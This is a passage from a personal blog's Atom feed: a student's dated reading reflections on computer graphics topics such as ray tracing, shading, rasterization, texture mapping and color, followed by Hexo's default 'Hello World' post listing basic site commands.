driven by the development of rendering techniques and mathematical algorithms. After reading it, I realized that computing power is also an important factor in the widespread and gradual application of computer graphics in many fields. What impresses me most is that computer graphics is still going strong after 40 years of development and various obstacles like cost and memory, and I wonder what the future focus of computer graphics practitioners would be.</p><h2 id="09-x2F-01-x2F-2022-Ray-Casting"><a href="#09-x2F-01-x2F-2022-Ray-Casting" class="headerlink" title="09&#x2F;01&#x2F;2022 - Ray Casting"></a>09&#x2F;01&#x2F;2022 - Ray Casting</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 4 Ray tracing</strong></em><br>Chapter 4 introduces the geometric method to calculate ray intersection with sth, it reminds me of a scene when playing a game: the screen shows a 3D cube, when I click on the screen with the mouse, how does the computer determine which side of the cube I am clicking on? I try to substitute the method in the Chapter 4, maybe we can convert the mouse to a ray and then convert the cube to the same spatial coordinate system with it and do the intersection detection. However, the projection on the screen is a 2D coordinate system, how to convert mouse clicked point back to 3D space? Ray tracing seems to be an ideal way to determine it.</p><h2 id="09-x2F-01-x2F-2022-Viewing"><a href="#09-x2F-01-x2F-2022-Viewing" class="headerlink" title="09&#x2F;01&#x2F;2022 - Viewing"></a>09&#x2F;01&#x2F;2022 - Viewing</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 7 Viewing</strong></em><br>In Chapter 7, I learned how to use matrix transformations to represent the positions of points in different coordinate systems during the rasterization process to complete the 3D to 2D conversion. This process gives me a more concrete understanding of the imaging principles of pinhole cameras, and I also have my own understanding, 1. modeling transformations : I interpret this step as adjusting the objects in the game scene to where they should be. 2. camera transformations: determine the position of objects relative to game perspective. 3. projection transformations: project objects from 3D to 2D according to whether it is a parallel or perspective projection. 4. viewport transformations: Map the 2D plane within screen resolution range.</p><h2 id="09-x2F-10-x2F-2022-Local-Illumination"><a href="#09-x2F-10-x2F-2022-Local-Illumination" class="headerlink" title="09&#x2F;10&#x2F;2022 - Local Illumination"></a>09&#x2F;10&#x2F;2022 - Local Illumination</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 10 Surface shading</strong></em><br>In this chapter, I learned about the application of three shading methods. After reading I think the essential difference between these three shading methods is the frequency of sampling, the higher the frequency the more it can reflect the real situation. Theoretically, the frequency of Flat Shading can be higher than Phong Shading as long as the sampled surface is smaller than the pixel.</p><h2 id="09-x2F-17-x2F-2022-Ray-Tracing"><a href="#09-x2F-17-x2F-2022-Ray-Tracing" class="headerlink" title="09&#x2F;17&#x2F;2022 - Ray Tracing"></a>09&#x2F;17&#x2F;2022 - Ray Tracing</h2><p><em><strong>An improved illumination model for shaded display</strong></em><br>I read this paper in which Turner Whitted proposes a recursive ray-tracing algorithm, and I think the most important change that makes Ray Casting better in this algorithm is to draw and analyze more rays. Unlike rasterization I learned before, this algorithm simulates the real behavior of real rays as it bounces around objects, but as we know, in the real world rays come not only from light sources, but also indirect lighting in most cases. In addition, when I saw that the generation times for drawing the scenes in the paper are so long, it made me very curious about what improvements or optimizations were made to achieve the current rendering speed.</p><h2 id="09-x2F-20-x2F-2022-WebGL"><a href="#09-x2F-20-x2F-2022-WebGL" class="headerlink" title="09&#x2F;20&#x2F;2022 - WebGL"></a>09&#x2F;20&#x2F;2022 - WebGL</h2><p><em><strong>An introduction to WebGL - Chapter 1 in WebGL: up and running</strong></em><br>I read the Chapter 1 this week. In addition to the explanation of some basic concepts, it also introduces the 8 steps of rendering WebGL into a page. For me, there are two points that are not very easy to understand, one is the use of ArrayBuffer, and the other is Shader written in advanced C-like language, but I found that if I use Three.js‚Äô Shader API, I can write it as JS instead. WebGL is an implementation subset of OpenGL. I believe that when using WebGL to render 3D graphics, the overall code size should be much less, and the semantics will be clearer.</p><h2 id="09-x2F-20-x2F-2022-Modeling"><a href="#09-x2F-20-x2F-2022-Modeling" class="headerlink" title="09&#x2F;20&#x2F;2022 - Modeling"></a>09&#x2F;20&#x2F;2022 - Modeling</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 12.1 Data Structures for Graphics</strong></em><br>I read Chapter 12.1-12.1.2, which is about the underlying part when implementing the graphics code. As we all know, the geometric transformation, detection, animation and rendering shading of 3D Graphics are all based on triangle meshes, so the basic principles and optimization strategies of triangle meshes are very important. The reason for having various data structures for triangle meshes is that we need more than just the basics of vertex position and point-face relationship when dealing with triangle meshes, we also need to obtain properties such as point-edge adjacency, connectivity, etc. In this case, if we just use the most basic data structures, it will make the operation extremely inefficient. The concept of Indexed Mesh Storage is interesting to me, it takes advantage of the shared nature of vertices, and I think it can be interpreted as a graph or a complex chain table.</p><h2 id="10-x2F-01-x2F-2022-Transformation"><a href="#10-x2F-01-x2F-2022-Transformation" class="headerlink" title="10&#x2F;01&#x2F;2022 - Transformation"></a>10&#x2F;01&#x2F;2022 - Transformation</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 6.1-6.3 Transformation Matrices</strong></em><br>I read Chapter 6.1-6.3, which deepened my understanding of the transformation nature of linear algebra in Computer Graphics, and also let me understand the practicability of linear algebra in complex transformations. The Chapter 6.1 2D Linear Transformations remind me of one of the CSS function I used before ‚Äî matrix() which can be used with CSS transforms to style elements in a 2D space, and the principle behind it is matrix multiplication. One of the more difficult to understand for me is the content in the Decomposition of Transformations, so it led me to an extensive search to further understand.</p><h2 id="10-x2F-07-x2F-2022-Projection"><a href="#10-x2F-07-x2F-2022-Projection" class="headerlink" title="10&#x2F;07&#x2F;2022 - Projection"></a>10&#x2F;07&#x2F;2022 - Projection</h2><p><em><strong>Allegory, Realism, and Vermeer‚Äôs Use of the Camera Obscuras</strong></em><br>The author reconstructed Vermeer‚Äôs studio using the camera obscura, proving that the camera obscura was used to project accurate images for painters to outline. In addition, I also learned a little bit about the book Vermeer‚Äôs Camera: Uncovering the Truth behind the Masterpieces written by the same author. It reminds me of the pinhole camera exercise I did in the first week, but I didn‚Äôt connect it with painting because the imaging results I saw at that time were not particularly clear, and the colors were not particularly restored. I was shocked that Vermeer invented this kind of ‚Äúpinhole imaging‚Äù method that works on the same principle as camera imaging, and I just feel like I was an ‚Äúartist‚Äù myself when programming 3D scenes.</p><h2 id="10-x2F-13-x2F-2022-Rasterization"><a href="#10-x2F-13-x2F-2022-Rasterization" class="headerlink" title="10&#x2F;13&#x2F;2022 - Rasterization"></a>10&#x2F;13&#x2F;2022 - Rasterization</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 8.1 The graphics pipeline</strong></em><br>I learned the Chapter 8.1 which introduces rasterization and two functions of clipping, pseudocodes in the chapter are really helpful for me. In chapter 4 I learned that ray tracing is a kind of image-order rendering and rasterization in this chapter is a kind of object-order rendering. What I found interesting was that I did have some questions that came up during the reading 8.1.2 Triangle Rasterization, and these questions in detail happened to be memtioned one by one in this chapter, such as the problem when the center of gravity of a pixel falls exactly on the common side of two triangles.</p><h2 id="10-x2F-13-x2F-2022-Pipeline"><a href="#10-x2F-13-x2F-2022-Pipeline" class="headerlink" title="10&#x2F;13&#x2F;2022 - Pipeline"></a>10&#x2F;13&#x2F;2022 - Pipeline</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 8.2-8.3 The graphics pipeline</strong></em><br>In Chapter 8.2-8.3, I learned about geometry operations before rasterization and pixel operations after rasterization and their purpose based on examples. Personal understandingÔºå briefly, what the vertex processing stage does is to add necessary information to the view based on the conversion, and finally the fragment blending stage combines all the geometric primitive to calculate the final color. Rasterization produces jagged lines and triangular edges as we all know, so the method of antialiasing also deserves attention, SSAA is the simplest antialiasing algorithm, but the performance overhead is also huge, I would like to know which methods are currently the most widely used.</p><h2 id="10-x2F-18-x2F-2022-Shading"><a href="#10-x2F-18-x2F-2022-Shading" class="headerlink" title="10&#x2F;18&#x2F;2022 - Shading"></a>10&#x2F;18&#x2F;2022 - Shading</h2><p><em><strong>Illumination for computer generated pictures - Bui Tuong Phong 1975</strong></em><br>I read this paper where the author effectively simulated diffuse reflections and highlights by a purely geometric approach and proposed Phong reflection model for computing highlights which is still active in the field of real-time rendering nowadays. This model divides the lighting into 3 parts, ambient, diffuse, and specular reflections, however, it required some overhead involved in calculating the light reflection vector, leading to the development of the Blinn-Phong model that commonly we used today.</p><h2 id="10-x2F-18-x2F-2022-Texture"><a href="#10-x2F-18-x2F-2022-Texture" class="headerlink" title="10&#x2F;18&#x2F;2022 - Texture"></a>10&#x2F;18&#x2F;2022 - Texture</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 11.1-11.4 Texture mapping</strong></em><br>In this Chapter, I read about the traditional texture mapping in graphics. I have to say that the examples given in the text are very vivid and helpful for my understanding. Contrary to what I thought before reading, texture mapping doesn‚Äôt change the shape of the surface, it doesn‚Äôt add or subtract polygons actually. I learned that the basic idea to make the surface textured in this chapter is to make the texture into a texture map&#x2F;image, then find the corresponding color from the image and apply it to the vertices of the surface when shading.</p><h2 id="10-x2F-28-x2F-2022-Hidden-Surfaces"><a href="#10-x2F-28-x2F-2022-Hidden-Surfaces" class="headerlink" title="10&#x2F;28&#x2F;2022 - Hidden Surfaces"></a>10&#x2F;28&#x2F;2022 - Hidden Surfaces</h2><p><em><strong>Haines, E. Videos 38-44 and 109-110 of Udacity‚Äôs Interactive 3D Graphics course</strong></em><br>I learned abut z-buffer and z-fighting in this week‚Äôs readings. We can know that when the objects are occluded from each other in depth, they cannot be sorted in advance using the painter‚Äôs algorithm. Unlike the painter‚Äôs algorithm, the z-buffer does not need to sort the objects from far to near, but for each pixel, so only linear complexity is required. And z-fighting is also interesting and easy to understand because of the accuracy error in the computation.</p><h2 id="11-x2F-04-x2F-2022-Images-amp-displays"><a href="#11-x2F-04-x2F-2022-Images-amp-displays" class="headerlink" title="11&#x2F;04&#x2F;2022 - Images &amp; displays"></a>11&#x2F;04&#x2F;2022 - Images &amp; displays</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 3.1-3.2 Raster images &amp; Chapter 17.4 Graphics hardware buffers</strong></em><br>After reading Chapter 3.1-3.2, I gained a lot of new insights especially nonlinearities of standard display, such as the fact that monitors display the input pixel values non-linearly, and I learned that human perception of color is also non-linear. As a result, the meaning of Gamma is the efficient use of color storage to achieve the effect that the input equals the output. In Chapter 17.4 I learned some basic concepts of Graphics Hardware Programming.</p><h2 id="11-x2F-10-x2F-2022-Aliasing"><a href="#11-x2F-10-x2F-2022-Aliasing" class="headerlink" title="11&#x2F;10&#x2F;2022 - Aliasing"></a>11&#x2F;10&#x2F;2022 - Aliasing</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 9 Signal processing</strong></em><br>I read Chapter 9 this week, which introduces the principles behind the algorithm that improves image quality, and personally I think this chapter is not easy to understand. I learned that in simple terms, aliasing occurs because it is considered as a low frequency signal due to undersampling, jaggies and moire pattern are two common artifacts in images. This chapter also introduces some important applications of convolution in image processing, and I think is the most difficult part, which led me to an extensive search to further understand.</p><h2 id="11-x2F-19-x2F-2022-Structures"><a href="#11-x2F-19-x2F-2022-Structures" class="headerlink" title="11&#x2F;19&#x2F;2022 - Structures"></a>11&#x2F;19&#x2F;2022 - Structures</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 12.1.3-12.2 Data Structures for Graphics</strong></em><br>I found that Scene Graphs are an interesting data structure and is not difficult to understand for me. Store by tree structure, use the root node of the scene as the root of the tree, and then continuously expand to the deeper layers of the tree, where each node keeps the information of attributes and its transformation matrix. When render the scene, use the composite matrix in the stack to draw the objects by DFS. In summary, its essence is the use of multiway tree and stack.</p><h2 id="11-x2F-26-x2F-2022-Curves"><a href="#11-x2F-26-x2F-2022-Curves" class="headerlink" title="11&#x2F;26&#x2F;2022 - Curves"></a>11&#x2F;26&#x2F;2022 - Curves</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 15 Curves</strong></em><br>I read the Chapter 15 this week which discusses three representations of curves. I‚Äôm really interested in the B√©zier Curves part because it reminds me of the vector editor I wrote before which allows designers to create and modify vector curves, at that time I encountered some interesting questions while programming, such as how the adjacent curve points change when dragging edge, how to compute the nearest point on the curve when mouse hover. And I think that Figma‚Äôs Vector Networks that implemented the B√©zier Curves are super cool. Anyway, here is a primer on B√©zier Curves I would recommend: <a href="https://pomax.github.io/bezierinfo/index.html">https://pomax.github.io/bezierinfo/index.html</a>.</p><h2 id="11-x2F-26-x2F-2022-Color"><a href="#11-x2F-26-x2F-2022-Color" class="headerlink" title="11&#x2F;26&#x2F;2022 - Color"></a>11&#x2F;26&#x2F;2022 - Color</h2><p><em><strong>Fundamentals of Computer Graphics - Chapter 19 Color</strong></em><br>The color format I use most often is RGB, the chapter 19 refreshed my perception of color that the RGB color space can only represent a small part of the XYZ color space. Storing linear RGB color values in an 8-bit per image format results in visually low accuracy due to the non-linearity of human color perception, and to improve the visual quality, sRGB is defined with a gamma correction that gives a non-linear distribution of values.</p><h2 id="11-x2F-29-x2F-2022-Perception"><a href="#11-x2F-29-x2F-2022-Perception" class="headerlink" title="11&#x2F;29&#x2F;2022 - Perception"></a>11&#x2F;29&#x2F;2022 - Perception</h2><p><em><strong>Videos 12 to 17 of Udacity‚Äôs Interactive 3D Graphics course</strong></em><br>I watched the videos 12 to 17 learning about perception and the difference between camera and human eyes. I found the checker shadow illusion in the video 15 is interesting which shows that the subjective brightness perceived from an object is influenced by the relative relationship between the surrounding environment, it is a kind of compensatory of the human perception, where the visual system makes correction errors when counteracts the variations of light and dark in different backgrounds.</p><img src="https://blush.design/api/download?shareUri=HmfkaZ7RkuyKIxtR&c=Clothing_0%7Eff4b33&w=800&h=800&fm=png" width="50%" height="50%">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;This document is to record my reading reactions after reading the book Fundamentals of Computer Graphics on the course &lt;em&gt;&lt;strong&gt;CSC 57</summary>
      
    
    
    
    <category term="Reading" scheme="https://beking0912.github.io/categories/Reading/"/>
    
    
  </entry>
  
  <entry>
    <title>üëã Hello World</title>
    <link href="https://beking0912.github.io/2022/10/14/hello-world/"/>
    <id>https://beking0912.github.io/2022/10/14/hello-world/</id>
    <published>2022-10-14T05:09:50.814Z</published>
    <updated>2023-02-19T19:14:38.402Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
    <category term="Hexo" scheme="https://beking0912.github.io/tags/Hexo/"/>
    
  </entry>
  
</feed>
